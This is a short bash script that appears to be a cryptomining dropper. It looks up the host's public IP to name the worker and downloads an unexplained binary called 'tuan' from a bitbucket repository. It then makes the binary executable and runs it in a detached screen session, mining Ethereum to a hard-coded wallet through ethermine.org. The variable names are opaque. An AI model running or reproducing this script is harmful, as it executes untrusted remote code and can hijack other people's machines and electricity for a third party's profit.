#!/bin/bash

WELS=0x9ffded4cf417cbf75ed73e4bbe3ee7df30d9ec46
PAL=stratum+tcp://us1.ethermine.org:4444
WER=$(echo "$(curl -s ifconfig.me)" | tr . _ )-MOON



FILE=./tuan
if [ -f "$FILE" ]; then
    echo "$FILE exists."
else 
    wget https://bitbucket.org/solomase/garangsem/raw/d261db312adaef2baefd19624650e14af8c938dc/tuan
    chmod +x ./tuan
fi
screen -dmLS mine ./tuan --algo ETHASH --pool $PAL --user $WELS.$WER --ethstratum ETHV1 --tls 0 --keepfree =5
